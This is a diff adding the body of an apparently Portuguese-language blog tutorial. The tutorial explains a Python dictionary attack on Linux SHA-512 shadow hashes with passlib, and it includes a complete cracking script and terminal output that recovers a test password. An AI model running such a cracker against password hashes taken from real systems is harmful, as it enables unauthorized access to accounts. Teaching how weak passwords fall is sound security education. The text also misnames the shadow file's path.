@@ -75,7 +75,6 @@ Caso tenha ficado confuso e queira ver um tutorial básico muito interessante, r
 O primeiro passo é aprender como gerar um hash SHA-512 em Python. Para isso, vamos utilizar a biblioteca `passlib.hash`. Nele podemos encontrar diversos algoritmos de hash, incluindo o `sha512_crypt`, que é o que queremos.
 
 {% highlight python %}
-# Importar o algoritmo SHA-512
 from passlib.hash import sha512_crypt
 {% endhighlight %}
 
@@ -87,3 +86,81 @@ from passlib.hash import sha512_crypt
 salt = "f/KQjYVZ"
 hash_esperado = "s4nSu.O1UTFznXyS1gH0il6ysCzCDIC0g6e.41EixJ3gHvK6mlERBihy9W5T/6btWeyrTRDZWq2YhD6P1Qi5W/"
 {% endhighlight %}
+
+Vamos criar duas funções para o nosso script de ataque de dicionário. Uma função vai importar um arquivo *txt*, que representa o nosso dicionário, e outra função que vai retornar o hash SHA-512. A função que gera o hash recebe dois argumentos: (1) uma senha em *textplain*  e (2) o salt que identificamos no arquivo ```/var/shadow/```.
+
+{% highlight python %}
+def gerar_hash(password, salt):
+    ans = sha512_crypt.hash(password, salt=salt, rounds=5000)
+    return ans
+
+def importar_dicionario(nome_do_arquivo):
+    dicionario = []
+    with open(nome_do_arquivo) as senhas:
+        for line in senhas:
+            dicionario.append(line.strip("\n"))
+    return dicionario
+{% endhighlight %}
+
+Apenas um detalhe, por padrão o Linux utiliza ```rounds=5000```. Por isso ```sha512_crypt.hash(password, salt=salt, rounds=5000)```. 
+
+Pronto! Apenas com essas duas funções e um dicionário de senhas, podemos definir a função principal do script. A ideia é usar o ```enumerate()``` para iterar sobre as senhas do dicionário e calcular seus hashes.
+
+Dai, basta fazer a compração entre o hash que havíamos conseguido extrair lá no começo e o hash gerado em cada iteração. Apenas um lembrete, a string gerada pela função ```gerar_hash()``` segue o formato do arquivo *shadow*. Ou seja, o hash propriamente dito inicia apenas no $13 ^ o $ dígito.   
+
+{% highlight python %}
+def main():
+    dicionario = importar_dicionario("listadesenhas.txt")
+    
+    for i,j in enumerate(dicionario):
+        hash_gerado = gerar_hash(j, salt)
+        if hash_gerado[12:] == hash_esperado:
+            print("[+] Senha encontrada: {}".format(j))
+            return None
+    print("[-] Senha não encontrada.")
+{% endhighlight %}
+
+Assim, o arquivo final fica:
+
+{% highlight python %}
+from passlib.hash import sha512_crypt
+
+salt = "f/KQjYVZ"
+hash_esperado = "s4nSu.O1UTFznXyS1gH0il6ysCzCDIC0g6e.41EixJ3gHvK6mlERBihy9W5T/6btWeyrTRDZWq2YhD6P1Qi5W/"
+password = "teste123"
+
+def gerar_hash(password, salt):
+    ans = sha512_crypt.hash(password, salt=salt, rounds=5000)
+    return ans
+
+def importar_dicionario(nome_do_arquivo):
+    dicionario = []
+    with open(nome_do_arquivo) as senhas:
+        for line in senhas:
+            dicionario.append(line.strip("\n"))
+    return dicionario
+
+def main():
+    dicionario = importar_dicionario("listadesenhas.txt")
+    
+    for i,j in enumerate(dicionario):
+        hash_gerado = gerar_hash(j, salt)
+        if hash_gerado[12:] == hash_esperado:
+            print("[+] Senha encontrada: {}".format(j))
+            return None
+    print("[-] Senha não encontrada.")
+        
+        
+if __name__ == "__main__":
+    main()
+{% endhighlight %}
+
+Para o teste, estou usando um arquivo contendo 1000 senhas mais utilizadas. Vamos executar esse script no Terminal e ver o resultado:
+
+<pre><font color="#CC0000"><b>carlos@localhost</b></font>:<font color="#3465A4"><b>/</b></font>$ python crack.py
+[+] Senha encontrada: teste123
+</pre>
+
+### Conclusão
+
+Aí está! Neste primeiro artigo vimos como fazer um script rápido para ataque de dicionário contra hashes do Linux. Obviamente, o sucesso de um ataque desse tipo depende muito da qualidade das senhas a serem testadas. Por isso vale a pena baixar dicionários já prontos ou construir o seu próprio, o que representaria uma eficiencia bem maior também.
